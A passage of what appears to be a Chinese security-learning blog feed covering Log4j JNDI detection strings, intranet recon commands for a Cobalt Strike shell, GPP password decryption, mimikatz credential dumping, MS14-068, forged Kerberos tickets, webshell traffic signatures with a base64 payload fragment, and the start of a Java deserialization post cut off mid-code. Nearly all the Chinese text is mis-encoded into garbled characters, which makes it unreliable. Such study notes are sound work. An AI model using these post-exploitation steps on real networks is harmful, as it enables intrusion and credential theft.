id="äºŒæ¬¡æ³¨å…¥"><a href="#äºŒæ¬¡æ³¨å…¥" class="headerlink" title="äºŒæ¬¡æ³¨å…¥"></a>äºŒæ¬¡æ³¨å…¥</h5><p>äºŒæ¬¡æ³¨å…¥å¯ä»¥ç†è§£ä¸ºï¼Œæ”»å‡»è€…æ„é€ çš„æ¶æ„æ•°æ®å­˜å‚¨åœ¨æ•°æ®åº“åï¼Œæ¶æ„æ•°æ®è¢«è¯»å–å¹¶è¿›å…¥åˆ°SQLæŸ¥è¯¢è¯­å¥æ‰€å¯¼è‡´çš„æ³¨å…¥ã€‚</p><h2 id="log4jåŸç†"><a href="#log4jåŸç†" class="headerlink" title="log4jåŸç†"></a>log4jåŸç†</h2><p>  é€šè¿‡JNDIæ³¨å…¥æ¼æ´ï¼Œé»‘å®¢å¯ä»¥æ¶æ„æ„é€ ç‰¹æ®Šæ•°æ®è¯·æ±‚åŒ…ï¼Œè§¦å‘æ­¤æ¼æ´ï¼Œä»è€ŒæˆåŠŸåˆ©ç”¨æ­¤æ¼æ´å¯ä»¥åœ¨ç›®æ ‡æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„ä»£ç </p><p><strong>JNID</strong></p><p> å³ Java çš„åç§°ä¸ç›®å½•æœåŠ¡æ¥å£ï¼Œåº”ç”¨é€šè¿‡è¯¥æ¥å£ä¸å…·ä½“çš„ç›®å½•æœåŠ¡è¿›è¡Œäº¤äº’</p><h5 id="æ”»å‡»ç‰¹å¾"><a href="#æ”»å‡»ç‰¹å¾" class="headerlink" title="æ”»å‡»ç‰¹å¾"></a>æ”»å‡»ç‰¹å¾</h5><p>æ”»å‡»è€…åœ¨æ”»å‡»è¿‡ç¨‹ä¸­å¯èƒ½ä½¿ç”¨ DNSLog è¿›è¡Œæ¼æ´æ¢æµ‹ï¼Œå»ºè®®æŸ¥çœ‹æ˜¯å¦æœ‰ç›¸å…³DNSlogå‘Šè­¦ï¼ˆå¯¹åº”ç§‘æ¥TSAè§„åˆ™ï¼šâ€œä¿¡æ¯æ³„éœ²-é€šè¿‡å¤–éƒ¨å¹³å°å›æ˜¾æ•°æ®â€ï¼‰ï¼›</p><p> å›æº¯æµé‡æˆ–æ—¥å¿—ä¸­æ˜¯å¦å­˜åœ¨â€œjndi:ldap://â€ã€â€œjndi:rmiâ€ç­‰å­—ç¬¦ã€‚</p><h2 id="å†…ç½‘"><a href="#å†…ç½‘" class="headerlink" title="å†…ç½‘"></a>å†…ç½‘</h2><h4 id="åŸºæœ¬å‘½ä»¤"><a href="#åŸºæœ¬å‘½ä»¤" class="headerlink" title="åŸºæœ¬å‘½ä»¤"></a>åŸºæœ¬å‘½ä»¤</h4><blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">CSä¸­ï¼šshell+å‘½ä»¤å³å¯</span><br><span class="line">//ä¸»æœºä¿¡æ¯</span><br><span class="line">systeminfo</span><br><span class="line"></span><br><span class="line">//ç½‘ç»œä¿¡æ¯</span><br><span class="line">ipconfig /all</span><br><span class="line"></span><br><span class="line">//è·¯ç”±è¡¨</span><br><span class="line">arp -a</span><br><span class="line"></span><br><span class="line">//è¿›ç¨‹ï¼ŒæŸ¥AV</span><br><span class="line">tasklist</span><br><span class="line"></span><br><span class="line">//ç«¯å£å ç”¨æƒ…å†µ</span><br><span class="line">netstat -ano</span><br><span class="line"></span><br><span class="line">//æ˜¯å¦åŸŸç¯å¢ƒ</span><br><span class="line">net user /domain</span><br><span class="line"></span><br><span class="line">//æ˜¯å¦å‡ºç½‘</span><br><span class="line">ping baidu.com -n 2</span><br></pre></td></tr></table></figure></blockquote><p>åœ¨æ¨ªå‘è¿è¾“å‰æœ€å¥½å…ˆæŒ‚æŒ‚ä»£ç†ï¼Œä½¿å¾—æˆ‘ä»¬å¯ä»¥ä½¿ç”¨msfçš„å…¶ä»–å·¥å…·</p><h4 id="æ¨ªå‘ç§»åŠ¨"><a href="#æ¨ªå‘ç§»åŠ¨" class="headerlink" title="æ¨ªå‘ç§»åŠ¨"></a>æ¨ªå‘ç§»åŠ¨</h4><p>â€‹        æ¨ªå‘ç§»åŠ¨æ˜¯æŒ‡å½“æ”»å‡»è€…åœ¨å†…éƒ¨ç½‘ç»œä¸­è·å¾—åˆå§‹è®¿é—®æƒé™ä»¥åï¼Œé€šè¿‡æ‰«æï¼Œå£ä»¤çˆ†ç ´ï¼Œsmbä¼ é€’ç­‰æŠ€æœ¯æ‰©å¤§æ•æ„Ÿæ•°æ®å’Œé«˜ä»·å€¼èµ„äº§æƒé™å¹¶é€šè¿‡å—æ”»å‡»ç½‘ç»œç¯å¢ƒä¸­ç§»åŠ¨çš„è¡Œä¸º</p><h4 id="åŸŸæ§"><a href="#åŸŸæ§" class="headerlink" title="åŸŸæ§"></a>åŸŸæ§</h4><p>â€‹        åŸŸæ§ç®€ç§°DCï¼Œæ˜¯åœ¨å†…ç½‘é‡Œå“åº”å®‰å…¨èº«ä»½è®¤è¯è¯·æ±‚çš„ç½‘ç»œæœåŠ¡å™¨ï¼Œå¯¹ç”¨æˆ·è¿›è¡Œèº«ä»½éªŒè¯ï¼Œå­˜å‚¨ç”¨æˆ·è´¦æˆ·ä¿¡æ¯ï¼Œå¹¶æ‰§è¡Œçš„åŸŸçš„ä¸€ç§å®‰å…¨ç­–ç•¥</p><h4 id="åŸŸ"><a href="#åŸŸ" class="headerlink" title="åŸŸ"></a>åŸŸ</h4><p>â€œåŸŸâ€æ˜¯ä¸€ä¸ªæœ‰å®‰å…¨è¾¹ç•Œçš„è®¡ç®—æœºç»„åˆï¼ˆä¸€ä¸ªåŸŸä¸­çš„ç”¨æˆ·æ— æ³•è®¿é—®å¦ä¸€ä¸ªåŸŸä¸­çš„èµ„æºï¼‰</p><h4 id="æ™®é€šç”¨æˆ·è·å–åŸŸç®¡ç†æƒé™"><a href="#æ™®é€šç”¨æˆ·è·å–åŸŸç®¡ç†æƒé™" class="headerlink" title="æ™®é€šç”¨æˆ·è·å–åŸŸç®¡ç†æƒé™"></a>æ™®é€šç”¨æˆ·è·å–åŸŸç®¡ç†æƒé™</h4><p><strong>åˆ©ç”¨GPPæ¼æ´è·å–åŸŸç®¡ç†æƒé™</strong></p><p>SYSVOLæ˜¯åŸŸå†…çš„å…±äº«æ–‡ä»¶å¤¹ï¼Œç”¨æ¥å­˜æ”¾ç™»å½•è„šæœ¬ã€ç»„ç­–ç•¥è„šæœ¬ç­‰ä¿¡æ¯ã€‚å½“åŸŸç®¡ç†å‘˜é€šè¿‡ç»„ç­–ç•¥ä¿®æ”¹å¯†ç æ—¶ï¼Œåœ¨è„šæœ¬ä¸­å¼•å…¥ç”¨æˆ·å¯†ç ï¼Œå°±å¯èƒ½å¯¼è‡´å®‰å…¨é—®é¢˜</p><p>1ï¼‰è®¿é—®SYSVOLå…±äº«æ–‡ä»¶å¤¹ï¼Œæœç´¢åŒ…å«â€œcpasswordâ€çš„XMLæ–‡ä»¶ï¼Œè·å–AESåŠ å¯†çš„å¯†ç ã€‚</p><p>2ï¼‰ä½¿ç”¨kaliè‡ªå¸¦çš„gpp-decryptè¿›è¡Œç ´è§£ï¼Œä»è€Œè·å–åŸŸè´¦å·å¯†ç ï¼Œç›´æ¥ç™»å½•åŸŸç®¡ç†å‘˜è´¦å·è·å–è®¿é—®æƒé™ã€‚</p><p><strong>è·å–æœåŠ¡å™¨æ˜æ–‡ç™»å½•å¯†ç </strong></p><p>ä½¿ç”¨kiwiæ¨¡å—éœ€è¦systemæƒé™ï¼Œæ‰€ä»¥æˆ‘ä»¬åœ¨ä½¿ç”¨è¯¥æ¨¡å—ä¹‹å‰éœ€è¦å°†å½“å‰MSFä¸­çš„shellæå‡ä¸ºsystemã€‚æåˆ°systemæœ‰ä¸¤ä¸ªæ–¹æ³•ï¼Œä¸€æ˜¯å½“å‰çš„æƒé™æ˜¯administratorç”¨æˆ·ï¼ŒäºŒæ˜¯åˆ©ç”¨å…¶å®ƒæ‰‹æ®µå…ˆææƒåˆ°administratorç”¨æˆ·ã€‚ç„¶åadministratorç”¨æˆ·å¯ä»¥ç›´æ¥getsystemåˆ°systemæƒé™</p><p><strong>ä½¿ç”¨MS14-068æ¼æ´è¿›è¡Œææƒ</strong></p><p>MS14068æ˜¯ä¸€ä¸ªèƒ½å¤Ÿä½¿æ™®é€šç”¨æˆ·ææƒåˆ°åŸŸæ§æƒé™çš„æƒé™æå‡æ¼æ´ã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡æ„é€ ç‰¹å®šçš„è¯·æ±‚åŒ…æ¥è¾¾åˆ°æå‡æƒé™çš„ç›®çš„</p><p><strong>çªƒå–åŸŸç®¡ç†å‘˜ä»¤ç‰Œ</strong></p><p><strong>è¿›ç¨‹è¿ç§»</strong></p><h4 id="ç¥¨æ®"><a href="#ç¥¨æ®" class="headerlink" title="ç¥¨æ®"></a>ç¥¨æ®</h4><p>åŸŸè®¤è¯ä¸‰éƒ¨æ›²ï¼š</p><ol><li>Client ä¸Šçš„ç”¨æˆ·è¯·æ±‚KDCæœåŠ¡ï¼Œæœ€åASæœåŠ¡ç”Ÿäº§TGTï¼Œè¿”å›ç»™Client</li><li>Client ä½¿ç”¨TGTè¯·æ±‚KDCä¸Šçš„TGSå¾—åˆ°STï¼ˆTGS ticketï¼‰çœŸæ­£è®¿é—®çš„ç¥¨æ®</li><li>Clientä½¿ç”¨STï¼ˆTGS Ticketï¼‰è®¿é—®Server</li></ol><p>åè¯åŸºæœ¬æ¦‚å¿µï¼š</p><p>â€‹    KDC: Key Distribution Centerï¼Œå¯†é’¥åˆ†å‘ä¸­å¿ƒï¼Œè´Ÿè´£ç®¡ç†ç¥¨æ®ã€è®¤è¯ç¥¨æ®ã€åˆ†å‘ç¥¨æ®ï¼Œä½†æ˜¯KDCä¸æ˜¯ä¸€ä¸ªç‹¬ç«‹çš„æœåŠ¡ï¼Œå®ƒç”±ASå’ŒTGSç»„æˆã€‚</p><p>â€‹    AD: Account Databaseï¼Œå­˜å‚¨æ‰€æœ‰clientçš„ç™½åå•ï¼Œåªæœ‰å­˜åœ¨äºç™½åå•çš„clientæ‰èƒ½é¡ºåˆ©ç”³è¯·åˆ°TGTã€‚</p><p>ï¼ˆç‰©ç†æ–¹é¢ KDCå’ŒAD éƒ½æ˜¯ä¸€ä¸ªæœºå­ï¼‰</p><p>â€‹    TGT: Ticket Granting Ticket = å…¥åœºåˆ¸ï¼Œé€šè¿‡å…¥åœºåˆ¸èƒ½å¤Ÿè·å¾—ç¥¨æ®ï¼Œæ˜¯ä¸€ç§ä¸´æ—¶å‡­è¯çš„å­˜åœ¨ã€‚</p><p>â€‹    ASï¼ˆAuthentication Serverï¼‰= è®¤è¯æœåŠ¡å™¨,ä¸ºclientç”ŸæˆTGTçš„æœåŠ¡</p><p>â€‹    TGSï¼ˆTicket Granting Serverï¼‰= ç¥¨æ®æˆæƒæœåŠ¡å™¨</p><p>â€‹    SSï¼ˆService Serverï¼‰= ç‰¹å®šæœåŠ¡æä¾›ç«¯</p><h5 id="ç™½é“¶ç¥¨æ®"><a href="#ç™½é“¶ç¥¨æ®" class="headerlink" title="ç™½é“¶ç¥¨æ®"></a>ç™½é“¶ç¥¨æ®</h5><p>å‰æï¼š</p><p>1.ä¸éœ€è¦ä¸KDCè¿›è¡Œäº¤äº’ï¼Œç›´æ¥å’Œserverè®¤è¯</p><p>2.éœ€è¦ç›®æ ‡æœåŠ¡çš„NTLM Hash</p><p>å¦‚æœæˆ‘ä»¬æ‹¥æœ‰Server Hashæ—¶ï¼Œæˆ‘ä»¬å°±å¯ä»¥ä¼ªé€ ä¸€ä¸ªä¸ç»è¿‡KDCè®¤è¯çš„ä¸€ä¸ªTicketï¼Œç›´æ¥å»serverç«¯å»éªŒè¯ã€‚</p><p>æ³¨ï¼šæœåŠ¡å™¨æ˜¯ä¸çŸ¥é“Server Session Keyæ˜¯ä»€ä¹ˆçš„ï¼ŒæœåŠ¡å™¨çš„Server Session Keyæ˜¯è§£å¯†ticketè·å¾—çš„ï¼Œæ‰€ä»¥ä¸€åˆ‡å‡­æ®çš„æ ¸å¿ƒåœ¨Server Hashï¼Œæœ‰äº†å®ƒå°±å¼€ä¸šç›´æ¥ä¼ªé€ ç¥¨æ®è®¤è¯ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ticket=Server Hash(Server Session Key+Client info+End Time) </span><br></pre></td></tr></table></figure><p>ç”±äºç™½é“¶ç¥¨æ®éœ€è¦ç›®æ ‡æœåŠ¡å™¨çš„Hashï¼Œæ‰€ä»¥æ²¡åŠæ³•ç”Ÿæˆå¯¹åº”åŸŸå†… æ‰€æœ‰æœåŠ¡å™¨çš„ç¥¨æ®ã€‚å› æ­¤åªèƒ½é’ˆå¯¹æœåŠ¡å™¨ ä¸Šçš„æŸäº›æœåŠ¡å»ä¼ªé€ </p><h5 id="é»„é‡‘ç¥¨æ®"><a href="#é»„é‡‘ç¥¨æ®" class="headerlink" title="é»„é‡‘ç¥¨æ®"></a>é»„é‡‘ç¥¨æ®</h5><p>å‰æï¼š</p><p>1.éœ€è¦ä¸DCé€šä¿¡</p><p>2.éœ€è¦krbtgtç”¨æˆ·çš„hashï¼ˆä¹Ÿå°±æ˜¯è¯´è¦æ‹¿ä¸‹åŸŸæ§åˆ¶å™¨ï¼‰</p><p>åŸç†ï¼š</p><p>å°±æ˜¯ä¼ªé€ çš„TGTï¼Œå®ƒä¼šåœ¨ç¬¬äºŒæ­¥è®¤è¯è¢«å‘é€åˆ°KDCçš„TGSï¼Œå¦‚æœæˆ‘ä»¬æœ‰äº†krbtgtç”¨æˆ·çš„hashå°±å¯ä»¥ç›´æ¥ä¼ªé€ TGTï¼Œå…¶ä¸­çš„KDCéœ€è¦çš„session keyï¼Œæ˜¯KDCè§£å¯†TGTä¹‹åè·å–çš„ï¼Œæ‰€ä»¥session keyä¹Ÿæ˜¯å’ŒTGTä¸€èµ·ä¼ªé€ çš„ï¼Œé‚£ä¹ˆåç»­çš„è®¤è¯ï¼Œå°±å¯ä»¥éšæ„çš„åˆ¶é€ æƒ³è¦çš„ç¥¨æ®äº†ã€‚</p><p><a href="https://blog.csdn.net/weixin_43171033/article/details/115933240">èµ„æ–™</a></p><p><a href="https://www.freebuf.com/articles/web/291655.html">èµ„æ–™</a></p><h4 id="ms14-068"><a href="#ms14-068" class="headerlink" title="ms14-068"></a>ms14-068</h4><p>æˆå› ï¼š</p><p>KDCï¼ˆå¯†é’¥åˆ†å‘ï¼‰å¯¹PACè¿›è¡ŒéªŒè¯æ—¶ï¼Œå¯¹äºPACå°¾éƒ¨çš„ç­¾åç®—æ³•ï¼Œè™½ç„¶åŸç†ä¸Šè§„å®šå¿…é¡»æ˜¯å¸¦æœ‰Keyçš„ç­¾åç®—æ³•æ‰å¯ä»¥ï¼Œä½†å¾®è½¯åœ¨å®ç°ä¸Šï¼Œå´å…è®¸ä»»æ„ç­¾åç®—æ³•ï¼Œåªè¦å®¢æˆ·ç«¯æŒ‡å®šä»»æ„ç­¾åç®—æ³•ï¼ŒKDCæœåŠ¡å™¨å°±ä¼šä½¿ç”¨æŒ‡å®šçš„ç®—æ³•è¿›è¡Œç­¾åéªŒè¯ã€‚å› æ­¤ä¼ªé€ çš„ä»»æ„å†…å®¹éƒ½å¯ä»¥æ˜¯åˆæ³•çš„ï¼Œç›´æ¥åŠ ä¸Šå†…å®¹çš„MD5å€¼ä½œä¸ºç­¾åå³å¯ï¼ˆç¬¬ä¸€ä¸ªåŸå› ï¼‰</p><p> PACæ²¡æœ‰è¢«æ”¾åœ¨TGTä¸­ï¼Œæ”¾åœ¨å…¶å®ƒåœ°æ–¹ã€‚KDCåœ¨ä»ç„¶èƒ½å¤Ÿæ­£ç¡®è§£æå‡ºæ²¡æœ‰æ”¾åœ¨TGTä¸­çš„PACä¿¡æ¯PACå¿…é¡»æ˜¯å¯†æ–‡ï¼Œç»è¿‡KeyåŠ å¯†çš„KDCä¼šä»Authenticatorä¸­å–å‡ºæ¥subkeyï¼ŒæŠŠPACä¿¡æ¯è§£å¯†å¹¶åˆ©ç”¨å®¢æˆ·ç«¯è®¾å®šçš„ç­¾åç®—æ³•éªŒè¯ç­¾åï¼ˆç¬¬äºŒä¸ªåŸå› ï¼‰</p><p>KDCéªŒè¯ç¼ºå°‘PACçš„TGTæˆåŠŸåï¼Œå†éªŒè¯ä¸åœ¨TGTä¸­ çš„PACçš„åˆæ³•æ€§ã€‚å¦‚æœ2ä¸ªå‡éªŒè¯æˆåŠŸï¼ŒKDCæŠŠPACä¸­çš„User SIDã€Group SIDå–å‡ºæ¥ï¼Œé‡æ–°ä½¿ç”¨è¿›è¡Œç­¾åï¼Œç­¾åç®—æ³•å’Œå¯†é’¥ä¸è®¾ç½®inclue-pacæ ‡å¿—ä½ä¸ºTRUEæ—¶ä¸€æ¨¡ä¸€æ ·ã€‚å°†å°†æ–°äº§ç”Ÿçš„PACåŠ å…¥åˆ°è§£å¯†åçš„TGTä¸­ï¼Œå†é‡æ–°åŠ å¯†åˆ¶ä½œå…¨æ–°çš„TGTå‘é€ç»™Clientï¼Œä¸æ˜¯TGSï¼ˆç¬¬ä¸‰ä¸ªåŸå› ï¼‰</p><p><a href="https://www.cnblogs.com/feizianquan/p/11760564.html#autoid-5-0-0">èµ„æ–™</a></p><h2 id="webshellæµé‡åˆ†æ"><a href="#webshellæµé‡åˆ†æ" class="headerlink" title="webshellæµé‡åˆ†æ"></a>webshellæµé‡åˆ†æ</h2><h4 id="èœåˆ€"><a href="#èœåˆ€" class="headerlink" title="èœåˆ€"></a>èœåˆ€</h4><p>é™æ€ç‰¹å¾ï¼š ä¸€å¥è¯æœ¨é©¬</p><p>åŠ¨æ€ç‰¹å¾ï¼š</p><blockquote><p>è¯·æ±‚åŒ…ä¸­ï¼š</p><p>uaå¤´ä¸ºç™¾åº¦çˆ¬è™«</p><p>è¯·æ±‚ä½“ä¸­å­˜åœ¨eavlï¼Œbase64ç­‰ç‰¹å¾å­—ç¬¦</p><p>è¯·æ±‚ä½“ä¸­ä¼ é€’çš„payloadä¸ºbase64ç¼–ç ï¼Œå¹¶ä¸”å­˜åœ¨å›ºå®šçš„QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtpZihQSFBfVkVSU0lPTjwnNS4zLjAnKXtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO307ZWNobygiWEBZIik7J</p><p>è¯·æ±‚ä½“ä¸­æ‰§è¡Œç»“æœå“åº”ä¸ºæ˜æ–‡</p></blockquote><h4 id="èšå‰‘"><a href="#èšå‰‘" class="headerlink" title="èšå‰‘"></a>èšå‰‘</h4><p><strong>é»˜è®¤ç¼–ç è¿æ¥æ—¶</strong></p><p>è¿™é‡Œæˆ‘ä»¬ç›´æ¥ä½¿ç”¨èœåˆ€çš„ä¸€å¥è¯webshell</p><p>æ¯ä¸ªè¯·æ±‚ä½“éƒ½å­˜åœ¨@ini_set(â€œdisplay_errorsâ€, â€œ0â€);@set_time_limit(0)å¼€å¤´ã€‚å¹¶ä¸”å­˜åœ¨base64ç­‰å­—ç¬¦</p><p>å“åº”åŒ…çš„ç»“æœè¿”å›æ ¼å¼ä¸º éšæœºæ•° ç»“æœ éšæœºæ•°</p><p><strong>ä½¿ç”¨base64ç¼–ç å™¨å’Œè§£ç å™¨æ—¶</strong></p><p>èšå‰‘ä¼šéšæœºç”Ÿæˆä¸€ä¸ªå‚æ•°ä¼ å…¥base64ç¼–ç åçš„ä»£ç ï¼Œå¯†ç å‚æ•°çš„å€¼æ˜¯é€šè¿‡POSTè·å–éšæœºå‚æ•°çš„å€¼ç„¶åè¿›è¡Œbase64è§£ç åä½¿ç”¨evalæ‰§è¡Œ</p><p>å“åº”åŒ…çš„ç»“æœè¿”å›æ ¼å¼ä¸º éšæœºæ•° ç¼–ç åçš„ç»“æœ éšæœºæ•°</p><h4 id="å†°è"><a href="#å†°è" class="headerlink" title="å†°è"></a>å†°è</h4><p>é‡‡ç”¨é‡‡ç”¨é¢„å…±äº«å¯†é’¥ï¼Œå¯†é’¥æ ¼å¼ä¸ºmd5(â€œadminâ€)[0:16], æ‰€ä»¥åœ¨å„ç§è¯­è¨€çš„webshellä¸­éƒ½ä¼šå­˜åœ¨16ä½æ•°çš„è¿æ¥å¯†ç ï¼Œé»˜è®¤å˜é‡ä¸ºkã€‚</p><p>åœ¨PHPä¸­ä¼šåˆ¤æ–­æ˜¯å¦å¼€å¯opensslé‡‡ç”¨ä¸åŒçš„åŠ å¯†ç®—æ³•ï¼Œåœ¨ä»£ç ä¸­åŒæ ·ä¼šå­˜åœ¨evalæˆ–assertç­‰å­—ç¬¦ç‰¹å¾</p><p>åœ¨jspä¸­åˆ™åˆ©ç”¨javaçš„åå°„ï¼Œæ‰€ä»¥ä¼šå­˜åœ¨ClassLoaderï¼ŒgetClass().getClassLoader()ç­‰å­—ç¬¦ç‰¹å¾</p><p>åœ¨apsä¸­ä¼šåœ¨forå¾ªç¯è¿›è¡Œä¸€æ®µå¼‚æˆ–å¤„ç†</p><h5 id="å†°è2-0-webshellæœ¨é©¬åŠ¨æ€ç‰¹å¾"><a href="#å†°è2-0-webshellæœ¨é©¬åŠ¨æ€ç‰¹å¾" class="headerlink" title="å†°è2.0 webshellæœ¨é©¬åŠ¨æ€ç‰¹å¾"></a>å†°è2.0 webshellæœ¨é©¬åŠ¨æ€ç‰¹å¾</h5><p>åœ¨äº†è§£å†°è3.0ä¹‹å‰ï¼Œå…ˆçœ‹çœ‹2.0æ˜¯æ€ä¹ˆäº¤äº’ç­‰</p><p>2.0ä¸­é‡‡ç”¨åå•†å¯†é’¥æœºåˆ¶ã€‚ç¬¬ä¸€é˜¶æ®µè¯·æ±‚ä¸­è¿”å›åŒ…çŠ¶æ€ç ä¸º200ï¼Œè¿”å›å†…å®¹å¿…å®šæ˜¯16ä½çš„å¯†é’¥</p><p>Accept: text/html, image/gif, image/jpeg, *; q=.2, <em>/</em>; q=.2</p><p>å»ºç«‹è¿æ¥å æ‰€æœ‰è¯·æ±‚ Cookieçš„æ ¼å¼éƒ½ä¸º: Cookie: PHPSESSID=; path=/ï¼›</p><h5 id="å†°è3-0-webshellæœ¨é©¬åŠ¨æ€ç‰¹å¾"><a href="#å†°è3-0-webshellæœ¨é©¬åŠ¨æ€ç‰¹å¾" class="headerlink" title="å†°è3.0 webshellæœ¨é©¬åŠ¨æ€ç‰¹å¾"></a>å†°è3.0 webshellæœ¨é©¬åŠ¨æ€ç‰¹å¾</h5><p>åœ¨3.0ä¸­æ”¹äº†ï¼Œå»é™¤äº†åŠ¨æ€å¯†é’¥åå•†æœºåˆ¶ï¼Œé‡‡ç”¨é¢„å…±äº«å¯†é’¥ï¼Œå…¨ç¨‹æ— æ˜æ–‡äº¤äº’ï¼Œå¯†é’¥æ ¼å¼ä¸ºmd5(â€œadminâ€)[0:16],ä½†è¿˜æ˜¯ä¼šå­˜åœ¨ä¸€äº›ç‰¹å¾</p><p>åœ¨ä½¿ç”¨å‘½ä»¤æ‰§è¡ŒåŠŸèƒ½æ—¶ï¼Œè¯·æ±‚åŒ…ä¸­content-length ä¸º5740æˆ–5720ï¼ˆå¯èƒ½ä¼šæ ¹æ®Javaç‰ˆæœ¬è€Œæ”¹å˜ï¼‰</p><p>æ¯ä¸€ä¸ªè¯·æ±‚å¤´ä¸­å­˜åœ¨Pragma: no-cacheï¼ŒCache-Control: no-cache</p><p>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,<em>/</em>;q=0.8,application/signed-exchange;v=b3;q=0.9</p><h4 id="å“¥æ–¯æ‹‰"><a href="#å“¥æ–¯æ‹‰" class="headerlink" title="å“¥æ–¯æ‹‰"></a>å“¥æ–¯æ‹‰</h4><p>å“¥æ–¯æ‹‰webshellé™æ€ç‰¹å¾</p><p>é€‰æ‹©é»˜è®¤è„šæœ¬ç¼–ç ç”Ÿæˆçš„æƒ…å†µä¸‹ï¼Œjspä¼šå‡ºç°xc,passå­—ç¬¦å’ŒJavaåå°„ï¼ˆClassLoaderï¼ŒgetClass().getClassLoader()ï¼‰ï¼Œbase64åŠ è§£ç ç­‰ç‰¹å¾</p><p>phpï¼Œaspåˆ™ä¸ºæ™®é€šçš„ä¸€å¥è¯æœ¨é©¬</p><h5 id="å“¥æ–¯æ‹‰webshellåŠ¨æ€ç‰¹å¾"><a href="#å“¥æ–¯æ‹‰webshellåŠ¨æ€ç‰¹å¾" class="headerlink" title="å“¥æ–¯æ‹‰webshellåŠ¨æ€ç‰¹å¾"></a>å“¥æ–¯æ‹‰webshellåŠ¨æ€ç‰¹å¾</h5><p>æ‰€æœ‰è¯·æ±‚ä¸­Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,<em>/</em>;q=0.8</p><p>æ‰€æœ‰å“åº”ä¸­Cache-Control: no-store, no-cache, must-revalidate,</p><p>ä»¥ä¸Šä¸¤ä¸ªåªèƒ½ä½œä¸ºå¼±ç‰¹å¾å‚è€ƒ</p><p>åŒæ—¶åœ¨æ‰€æœ‰è¯·æ±‚ä¸­Cookieä¸­åé¢éƒ½å­˜åœ¨ï¼›ç‰¹å¾</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>javaååºåˆ—åŒ–å­¦ä¹ ï¼ˆäºŒï¼‰</title>
      <link href="/2022/06/17/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
      <url>/2022/06/17/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%BA%8C%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h2 id="ååºåˆ—åŒ–æ¼æ´åŸç†"><a href="#ååºåˆ—åŒ–æ¼æ´åŸç†" class="headerlink" title="ååºåˆ—åŒ–æ¼æ´åŸç†"></a>ååºåˆ—åŒ–æ¼æ´åŸç†</h2><p>1ã€æ¥å—ä»»æ„å¯¹è±¡</p><p>2ã€æ‰§è¡ŒreadObjectæ–¹æ³•</p><p>javaååºåˆ—åŒ–è°ƒç”¨æ—¶ä¸€å®šä¼šè°ƒç”¨readObjectæ–¹æ³•ï¼Œç”±äºreadObjectæ˜¯å¯ä»¥é‡å†™çš„ï¼Œç„¶åæˆ‘ä»¬é€šè¿‡ä¼ é€’ä¸€äº›å±é™©çš„å¯¹è±¡ä»è€Œè°ƒç”¨å±é™©çš„æ–¹æ³•</p><p>å¯ä»¥åˆ©ç”¨ä¸åŒç±» çš„åŒåå‡½æ•°</p><p>ä»»æ„æ–¹æ³•è°ƒç”¨ï¼ˆåå°„/åŠ¨æ€åŠ è½½å­—èŠ‚ç ï¼‰</p><p>readObject()æ–¹æ³•çš„ä½œç”¨æ­£æ˜¯ä»ä¸€ä¸ªæºè¾“å…¥æµä¸­è¯»å–å­—èŠ‚åºåˆ—ï¼Œå†æŠŠå®ƒä»¬ååºåˆ—åŒ–ä¸ºä¸€ä¸ªå¯¹è±¡ï¼Œå¹¶å°†å…¶è¿”å›ï¼ŒreadObject()æ˜¯å¯ä»¥é‡å†™çš„ï¼Œå¯ä»¥å®šåˆ¶ååºåˆ—åŒ–çš„ä¸€äº›è¡Œä¸ºã€‚</p><p><strong>æ³¨æ„</strong></p><p>å…¥å£ç±»è¦å¯åºåˆ—åŒ–ï¼ŒåŒæ—¶é‡å†™äº†readObjectï¼Œæ¥å—ä»»æ„å¯¹è±¡ä½œä¸ºå‚æ•°</p><h2 id="cc1é“¾"><a href="#cc1é“¾" class="headerlink" title="cc1é“¾"></a>cc1é“¾</h2><p><strong>ç¯å¢ƒ</strong></p><p>éœ€è¦jdk-8u65</p><p>mavenéœ€è¦3.2.1</p><p>åˆ©ç”¨ç‚¹ï¼šTransformerç±»ï¼›åˆ©ç”¨invoketransformerå†…éƒ¨çš„Transformerç±»ä»è€Œåˆ©ç”¨åå°„ï¼Œå®ç°å±é™©å‡½æ•°åˆ©ç”¨ã€‚</p><p><strong>æ¼æ´åˆ©ç”¨è¿‡ç¨‹</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span 